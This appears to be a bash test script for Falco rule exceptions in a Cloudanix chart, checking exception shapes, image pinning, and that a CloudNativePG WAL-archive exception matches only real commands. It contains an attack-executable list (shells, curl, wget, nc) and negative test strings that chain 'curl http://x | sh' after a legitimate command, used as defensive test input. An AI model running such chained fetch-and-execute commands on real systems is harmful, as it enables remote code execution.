#!/usr/bin/env bash
# Contract for the platform exceptions in rules/cloudanix.yaml (docs/falco-rules.md section 4a).
# falco_rules_validate_test.sh proves Falco accepts the file; this proves the exceptions say
# what we mean: our names are reserved, every row has one value per field, no value carries a
# quote (Falco 0.41.1 would emit it unescaped and reject the file on every cluster), an exception
# keyed on an image also requires the image's own binary (proc.is_exe_upper_layer = false), lists
# each image's digest-pinned form (<repo>@sha256) and never covers a shell or a dropped tool, and
# the CloudNativePG one matches the archive_command CloudNativePG really runs and nothing chained
# after it.
# Requires yq and grep -E. Run: chart/tests/falco_baseline_exceptions_test.sh
set -euo pipefail

cd "$(dirname "$0")/../.."
RULES=${RULES:-chart/rules/cloudanix.yaml} # override to check a candidate file
fail=0

ok() { echo "ok   - $1"; }
bad() { echo "FAIL - $1"; fail=1; }
check() { # <label> <command...>: passes when the command succeeds
  local label=$1; shift
  if "$@"; then ok "$label"; else bad "$label"; fi
}

# Executables an attacker uses once inside a container. An image-keyed row whose executable
# pattern also matches one of these would silence the rule for that attack.
ATTACK_EXES=(/bin/sh /bin/bash /bin/dash /usr/bin/dash /usr/bin/curl /usr/bin/wget /usr/bin/kubectl
  /usr/local/bin/kubectl /usr/bin/python3 /usr/bin/nc /tmp/x /dev/shm/x)
# Customer-private registries: a row for one of these would be one customer's application.
PRIVATE_REGISTRIES='ocir\.io|amazonaws\.com|azurecr\.io|docker\.pkg\.dev/[^/]+/[^/]+-private'

exception() { # <rule> <name> <yq expr on the exception>
  yq ".[] | select(.rule == \"$1\") | .exceptions[] | select(.name == \"$2\") | $3" "$RULES"
}

test_names_reserved() {
  local names bad_names
  names=$(yq '.[] | select(has("exceptions")) | .exceptions[].name' "$RULES")
  bad_names=$(grep -v '^cdx_baseline_' <<<"$names" || true)
  check "every exception in cloudanix.yaml is named cdx_baseline_*" test -z "$bad_names"
  check "exception names are unique" test "$(sort <<<"$names" | uniq -d | wc -l | tr -d ' ')" = 0
}

test_shapes() {
  local mismatched quoted unguarded
  # fields, comps and every values row have the same length; Falco rejects anything else, but
  # only when the file is loaded on a node.
  mismatched=$(yq '.[] | select(has("exceptions")) | .exceptions[]
    | select((.fields | length) != (.comps | length)
             or ([.values[] | select(length != (parent | parent | .fields | length))] | length) > 0)
    | .name' "$RULES")
  check "every exception has one comp and one value per field" test -z "$mismatched"
  quoted=$(yq '.[] | select(has("exceptions")) | .exceptions[] | select([.values[] | .. | select(tag == "!!str" and test("\""))] | length > 0) | .name' "$RULES")
  check "no exception value contains a double quote" test -z "$quoted"
  # Falco splices exception values into the condition and quotes only values with a space: a
  # value with ( ) or | and no space comes out bare and breaks the parse on every cluster.
  local bare
  bare=$(yq '.[] | select(has("exceptions")) | .exceptions[] | select([.values[] | .. | select(tag == "!!str" and test("[()|]") and (test(" ") | not))] | length > 0) | .name' "$RULES")
  check "no exception value has ( ) or | without a space (Falco leaves it unquoted)" test -z "$bare"
  # A payload written over an excepted path inside the container must still fire.
  unguarded=$(yq '.[] | select(has("exceptions")) | .exceptions[]
    | select((.fields | contains(["container.image.repository"])) and ((.fields | contains(["proc.is_exe_upper_layer"])) | not))
    | .name' "$RULES")
  check "every image-keyed exception requires proc.is_exe_upper_layer" test -z "$unguarded"
  # A digest-pinned image reports its repository as <repo>@sha256, so every image listed by
  # equality also lists that form (comp `in`). A startswith prefix covers both already.
  local unpinned row
  # shellcheck disable=SC2016  # $i, $n and $l are yq variables
  unpinned=$(yq '.[] | select(has("exceptions")) | .exceptions[]
    | (.fields | to_entries | map(select(.value == "container.image.repository")) | .[0].key) as $i
    | select($i != null) | select(.comps[$i] != "startswith")
    | .name as $n | .values[] | ([.[$i]] | flatten) as $l
    | (($l | map(select(test("@sha256$") | not) | . + "@sha256")) - $l) | .[]
    | $n + ": " + sub("@sha256$"; "")' "$RULES")
  [ -n "$unpinned" ] || ok "every image-keyed exception lists each image's @sha256 form"
  while IFS= read -r row; do
    [ -z "$row" ] || bad "$row is not also listed as its @sha256 form"
  done <<<"$unpinned"
}

matches_any_attack_exe() { # <glob>: succeeds when the pattern matches an attack executable
  local exe
  for exe in "${ATTACK_EXES[@]}"; do
    # shellcheck disable=SC2053  # unquoted RHS: a pattern, the same syntax Falco's glob (fnmatch) uses
    [[ $exe == $1 ]] && return 0
  done
  return 1
}

test_k8s_operators() {
  local rule='Contact K8S API Server From Container' name=cdx_baseline_k8s_operators rows images image exe layer
  check "$name keys on images, executable pattern and lower layer" \
    test "$(exception "$rule" $name '[.fields, .comps] | flatten | join(",")')" = \
    "container.image.repository,proc.exepath,proc.is_exe_upper_layer,in,glob,="
  # One row per image: [[repo, repo@sha256], executable, false] (a digest-pinned image reports
  # its repository with @sha256).
  rows=$(exception "$rule" $name '.values[] | [(.[0] | join(",")), .[1], .[2]] | join(" ")')
  check "$name has rows" test -n "$rows"
  while read -r images exe layer; do
    IFS=, read -r -a list <<<"$images"
    [[ ${#list[@]} == 2 && ${list[1]} == "${list[0]}@sha256" ]] ||
      bad "$name: row $images is not [repo, repo@sha256]"
    for image in "${list[@]}"; do
      [[ $image == */* && ${image%%/*} == *.* ]] || bad "$name: $image is not registry-qualified"
      [[ $image =~ $PRIVATE_REGISTRIES ]] && bad "$name: $image is a private registry"
      [[ $image == docker.io/cloudanix/* ]] && bad "$name: $image belongs in cdx_baseline_own_agents"
    done
    [[ $exe == /?* ]] || bad "$name: $images executable '$exe' is not an absolute path"
    matches_any_attack_exe "$exe" && bad "$name: $images executable '$exe' also covers a shell or tool"
    [[ $layer == false ]] || bad "$name: $images row does not require the lower layer"
  done <<<"$rows"
  check "$name lists each image once" \
    test "$(exception "$rule" $name '.values[][0][]' | sort | uniq -d | wc -l | tr -d ' ')" = 0
}

test_cnpg_wal_archive() {
  local rule='Run shell untrusted' name=cdx_baseline_cnpg_wal_archive cmd
  check "$name keys on parent name and a full-match command regex" \
    test "$(exception "$rule" $name '[.fields, .comps] | flatten | join(",")')" = \
    "proc.pname,proc.cmdline,=,regex"
  check "$name parent is postgres in every row" \
    test "$(exception "$rule" $name '.values[][0]' | sort -u)" = postgres
  # Falco's regex is RE2 POSIX, anchored at both ends: grep -Ezx is the same match. A command is
  # excepted when any row matches.
  matches() {
    local pattern
    while IFS= read -r pattern; do
      printf '%s' "$1" | grep -Ezqx -- "$pattern" && return 0
    done < <(exception "$rule" $name '.values[][1]')
    return 1
  }
  # Every shape in EW1's findings (2026-11-20, CloudNativePG with PostgreSQL 18), plus .backup.
  local cmd_prefix="sh -c -- /controller/manager" log="--log-destination /controller/log/postgres.json"
  local archive="$cmd_prefix wal-archive $log pg_wal/000000020000002A0000000C"
  for cmd in "$archive" "$cmd_prefix wal-archive $log pg_wal/000000040000002900000059.partial" \
    "$cmd_prefix wal-archive $log pg_wal/00000005.history" "$archive.00000028.backup" \
    "$cmd_prefix wal-restore $log 00000001000000150000002D pg_wal/RECOVERYXLOG" \
    "$cmd_prefix wal-restore $log 00000005.history pg_wal/RECOVERYHISTORY"; do
    if matches "$cmd"; then ok "$name matches: ${cmd#"$cmd_prefix "}"; else bad "$name matches: ${cmd#"$cmd_prefix "}"; fi
  done
  # A command chained after the archive or restore call (COPY ... FROM PROGRAM) must still alert.
  for cmd in "$archive; curl http://x | sh" "$archive && id" "$cmd_prefix wal-archive x; curl | sh" \
    "$cmd_prefix wal-restore $log 00000001000000150000002D pg_wal/RECOVERYXLOG; id" \
    "sh -c -- curl http://x | sh" "$cmd_prefix wal-restore x" "sh -c id"; do
    if matches "$cmd"; then bad "$name also matches: $cmd"; else ok "$name does not match: $cmd"; fi
  done
}

test_names_reserved
test_shapes
test_k8s_operators
test_cnpg_wal_archive
exit $fail
